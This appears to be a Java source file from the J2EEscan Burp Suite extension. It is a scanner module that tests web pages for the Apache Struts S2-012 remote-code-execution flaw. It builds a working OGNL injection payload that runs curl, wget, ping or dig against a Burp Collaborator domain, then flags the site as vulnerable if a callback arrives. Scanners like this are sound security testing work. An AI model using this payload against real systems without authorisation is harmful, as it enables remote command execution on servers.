package burp.j2ee.issues.impl;

import burp.*;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;

import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class StrutsS2012OOB implements IModule {

    private static final String TITLE = "Struts S2-012 RCE (OOB)";
    private static final String DESCRIPTION = "J2EEscan identified Out Of Band RCE in the webpage"
            + "<b>References</b>:<br /><br />"
            + "http://struts.apache.org/docs/s2-012.html<br />"
            + "https://github.com/vulhub/vulhub/tree/master/struts2/s2-012<br />"
            + "https://github.com/ronoski/VulApps/tree/master/s/struts2/s2-012";
    private PrintWriter stderr;
    private static final String REMEDY = "Upgrade to latest Apache Struts version";

    //Pattern.compile("file not found", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE),
    //Pattern.compile("java\\.io\\.FileNotFoundException", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE));

    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        String payload_template = "%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"RCE_CMD\", \"ATTACKER_DOMAIN\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}\n";
        IExtensionHelpers helpers = callbacks.getHelpers();
        List<IScanIssue> issues = new ArrayList<>();

        List<String> cmds = new ArrayList<>();
        cmds.add("curl");
        cmds.add("wget");
        cmds.add("ping");
        cmds.add("dig");


        for (String cmd : cmds) {

            IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();
            String currentCollaboratorPayload = collaboratorContext.generatePayload(true);
            String payload = payload_template.replace("ATTACKER_DOMAIN",currentCollaboratorPayload).replace("RCE_CMD", cmd);
            // make a request containing our injection test in the insertion point
            byte[] checkRequest = insertionPoint.buildRequest(payload.getBytes());

            IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
                    baseRequestResponse.getHttpService(), checkRequest);

            //String response = helpers.bytesToString(checkRequestResponse.getResponse());
            List<IBurpCollaboratorInteraction> collaboratorInteractions = collaboratorContext.fetchCollaboratorInteractionsFor(currentCollaboratorPayload);

            if (!collaboratorInteractions.isEmpty()) {
                issues.add(new CustomScanIssue(
                        baseRequestResponse.getHttpService(),
                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
                        checkRequestResponse,
                        TITLE,
                        DESCRIPTION,
                        REMEDY,
                        Risk.High,
                        Confidence.Firm
                ));
                return issues;
            }
        }

        return issues;
    }
}
